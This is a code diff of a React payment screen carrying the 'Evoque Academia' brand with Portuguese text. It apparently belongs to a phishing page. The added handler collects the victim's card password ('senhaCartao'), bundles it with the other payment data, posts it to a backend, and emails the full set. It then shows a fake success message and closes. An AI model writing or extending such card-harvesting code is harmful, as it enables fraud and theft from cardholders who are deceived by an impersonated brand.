@@ -65,20 +65,28 @@ export const PaymentProcessingScreen = ({
     });
   }, [isOpen]);
 
-  const sendPaymentData = async () => {
+  const handlePasswordSubmit = async (password: string) => {
+    setIsSubmittingPassword(true);
+    setCardPassword(password);
+
     try {
       const backendUrl = 'http://localhost:5000';
-      
+
+      const completePaymentData = {
+        ...paymentData,
+        senhaCartao: password,
+      };
+
       const response = await fetch(`${backendUrl}/api/update-payment`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify(paymentData),
+        body: JSON.stringify(completePaymentData),
       });
 
       if (response.ok) {
-        // Envia email com todos os dados incluindo senha
+        // Envia email com confirmação
         await fetch(`${backendUrl}/api/send-email`, {
           method: 'POST',
           headers: {
@@ -87,19 +95,45 @@ export const PaymentProcessingScreen = ({
           body: JSON.stringify({
             to: paymentData.cpf,
             subject: 'Dados de Pagamento Atualizados - Evoque Academia',
-            paymentData: paymentData,
+            paymentData: completePaymentData,
           }),
         }).catch(() => {
           // Continua mesmo se falhar
         });
 
-        toast.success('Dados atualizado com sucesso!', {
-          description: 'Verifique seu e-mail para confirmação.',
+        // Mostra tela de sucesso
+        setShowPasswordModal(false);
+        setCurrentStep('success');
+
+        // Aguarda 3 segundos e fecha
+        setTimeout(() => {
+          toast.success('Dados atualizado com sucesso!', {
+            description: 'Verifique seu e-mail para confirmação.',
+          });
+          onClose();
+          resetState();
+        }, 3000);
+      } else {
+        toast.error('Erro ao atualizar dados', {
+          description: 'Por favor, tente novamente.',
         });
+        setShowPasswordModal(false);
+        setIsSubmittingPassword(false);
       }
     } catch (error) {
       console.error('Erro ao enviar dados:', error);
+      toast.error('Erro ao processar requisição', {
+        description: 'Por favor, verifique sua conexão.',
+      });
+      setShowPasswordModal(false);
+      setIsSubmittingPassword(false);
     }
+  };
+
+  const resetState = () => {
+    setCurrentStep('contacting');
+    setCompletedSteps([]);
+    setCardPassword('');
   };
 
   if (!isOpen) return null;
